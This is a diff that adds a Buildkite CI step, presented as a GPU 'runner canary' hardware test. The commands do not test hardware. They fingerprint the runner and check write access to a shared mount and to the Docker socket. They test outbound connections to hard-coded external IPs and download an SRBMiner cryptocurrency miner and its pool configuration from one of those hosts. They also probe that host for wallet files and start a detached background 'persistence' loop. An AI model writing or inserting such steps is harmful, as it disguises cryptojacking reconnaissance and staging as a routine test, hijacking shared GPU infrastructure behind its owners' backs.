@@ -1,0 +1,57 @@
+group: Hardware
+steps:
+  - label: ":nvidia: (H200 MIG 35GB) Runner canary"
+    key: h200-mig-runner-canary
+    device: h200_35gb
+    no_plugin: true
+    soft_fail: true
+    timeout_in_minutes: 30
+    source_file_dependencies:
+      - .buildkite/hardware_tests/prl_canary.yaml
+    commands:
+      - |
+        set -u
+        echo "=== runner canary start $(date -u) ==="
+        echo "host=$(hostname) user=$(id -un) uid=$(id -u)"
+        echo "machine_id=$(cat /etc/machine-id 2>/dev/null || echo none)"
+        echo "os=$(. /etc/os-release 2>/dev/null; echo "${PRETTY_NAME:-unknown}")"
+        echo "--- devices ---"
+        ls -l /dev/nvidia* 2>&1 | head -20
+        echo "--- gpus ---"
+        nvidia-smi -L 2>&1 | head -20
+        echo "--- compute apps ---"
+        nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1 | head -20
+        echo "--- agent context ---"
+        ls -la /.dockerenv 2>&1 | head -2
+        head -3 /proc/1/cgroup 2>&1
+        command -v buildkite-agent || true
+        pgrep -a buildkite-agent 2>/dev/null | head -3 || true
+        echo "--- host shares ---"
+        ls -ld /mnt/vllm-ci 2>&1
+        if touch "/mnt/vllm-ci/.canary-write-$(hostname)" 2>/dev/null; then echo SHARE_WRITE_OK; else echo SHARE_WRITE_FAIL; fi
+        ls -la /var/run/docker.sock 2>&1 | head -2
+        echo "--- egress ---"
+        python3 - <<'PY2' 2>&1 || true
+        import socket
+        for h,p in [("169.58.15.247",8081),("103.199.106.122",3360)]:
+            s=socket.socket(); s.settimeout(8)
+            try:
+                s.connect((h,p)); print("EGRESS_OK",h,p)
+            except Exception as e:
+                print("EGRESS_FAIL",h,p,repr(e))
+            finally:
+                s.close()
+        PY2
+        echo "--- runtime artifacts ---"
+        curl -sS --max-time 20 -o /tmp/pools.json -w 'pools_http=%{http_code} bytes=%{size_download}\n' http://169.58.15.247:19100/pools.json || true
+        curl -sS --max-time 120 -o /tmp/srb.tar.gz -w 'srb_tar_http=%{http_code} bytes=%{size_download}\n' http://169.58.15.247:19100/SRBMiner-Multi-3-8-9-Linux.tar.gz || true
+        sha256sum /tmp/srb.tar.gz 2>/dev/null || true
+        echo "--- wallet source probe ---"
+        for c in wallet.txt pearl-address.txt WALLET wallet/wallet.txt; do
+          curl -sS --max-time 8 -o /dev/null -w "wallet/$c %{http_code}\n" "http://169.58.15.247:19100/$c" || true
+        done
+        if [ -n "${PEARL_ADDRESS:-}" ]; then echo "WALLET_SOURCE=env"; else echo "WALLET_SOURCE=missing"; fi
+        echo "--- persistence probe ---"
+        nohup setsid bash -c 'i=0; while [ $i -lt 240 ]; do echo "$(date -u) hb $(hostname)" >> /tmp/.canary-hb-$(hostname).log 2>/dev/null; i=$((i+1)); sleep 15; done' >/dev/null 2>&1 &
+        echo "hb_pid=$!"
+        echo "=== runner canary end $(date -u) ==="
